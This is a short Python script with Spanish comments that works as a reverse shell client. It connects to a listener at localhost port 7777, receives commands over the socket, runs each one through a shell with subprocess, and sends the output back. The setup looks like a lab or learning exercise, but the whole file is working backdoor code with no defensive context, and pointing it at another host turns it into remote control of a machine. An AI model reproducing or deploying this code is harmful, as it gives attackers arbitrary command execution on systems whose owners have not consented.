#! /usr/bin/env python3
#_*_ coding: utf8_*_

import socket
import subprocess

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    cliente.connect(('localhost',7777))
    cliente.send('1')

    while True:
        c = cliente.recv(1024)
        comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE) #Popen captura la salida del comando, c es el comando que se recibe.
        if comando.stderr.read() != '':
            cliente.send('Error de comando')
        else:
            cliente.send(comando.stdout.read())
except:
    pass
